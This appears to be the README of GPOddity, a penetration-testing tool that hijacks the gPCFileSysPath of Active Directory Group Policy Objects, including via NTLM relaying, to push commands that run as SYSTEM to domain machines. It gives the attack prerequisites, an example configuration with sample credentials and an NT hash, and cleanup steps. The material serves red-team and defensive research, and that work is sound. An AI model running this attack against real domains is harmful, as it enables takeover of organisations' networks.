# GPOddity
The GPOddity tool aims to automate gPCFileSysPath attack vectors to exploit vulnerable Group Policy Objects, including through NTLM relaying.


The principle behind the attack and the motivation behind the project was originally described in the following article: https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more

**The attack implementation described in the article was improved since the article's release, especially regarding the exploitation of user GPOs. The latter are now supported by GPOddity directly.**


# Attack pre-requisites

The prerequisites necessary to carry out the attack are the following:
- A user with the permissions necessary to modify the `gPCFileSysPath` attribute of a target GPO.
- Either the credentials of a machine account, or the ability to write to a domain's SMB share.

# Configuration file

GPOddity arguments are specified through a configuration file - an example file is provided in the repository, `config.example.ini`.

```ini
[GENERAL]
# The target GPO GUID, without enclosing brackets
gpo_guid=8836DD9A-404E-4572-BA04-E779D9ED320C

# Generic domain information
domain=corp.com
dc-fqdn=ad01-dc.corp.com
#dc-ip=192.168.123.10

# The user with permissions to modify the target GPO's Group Policy Container
username=adm-qroland
password=Password1!
#hash=64F12CDDAA88057E06A81B54E73B949B
kerberos=False
ldaps=False


[SMB]
# SMB mode can be either domain or embedded. 'Domain' means that you want to use the SMB share of another machine in the domain.
# Embedded means that you want to use GPOddity's embedded SMB server
smb-mode=embedded

# Details regarding the account acting as an SMB server for the GPT.
smb-machine=SCAPY$
smb-ip=192.168.123.20
smb-nt=7facdc498ed1680c4fd1448319a8c04f
smb-share=gpoddity
smb-iface=eth0


[COMMANDS]
# For commands to be executed, you can provide module files (see https://github.com/synacktiv/GroupPolicyBackdoor/wiki and https://github.com/synacktiv/GroupPolicyBackdoor/tree/master/modules_templates)
# You can specify multiple module files, separated by commas
modules=/home/user/modules/ImmediateTask_computer.ini

# For convenience, you can also alternatively specify a command, command_type (either computer or user) and a command_shell (cmd or powershell).
# This will simply create an immediate task running as SYSTEM
#command=whoami > C:\OUT.txt
#command-type=computer
#command-shell=cmd
```

# About cleaning

By default, GPOddity will perform cleaning actions and among others restore the original gPCFIleSysPath value in the target domain. In case the exploit could not exit properly, GPOddity creates a cleaning folder each time the exploit is executed, that can be used later on to restore legitimate values by using the `--clean` flag; for instance:

```bash
$ python3 gpoddity.py --clean cleaning/2026_08_24_063428_381577/ --config config.ini
```


# Video demonstration

![demo](./assets/demo.gif)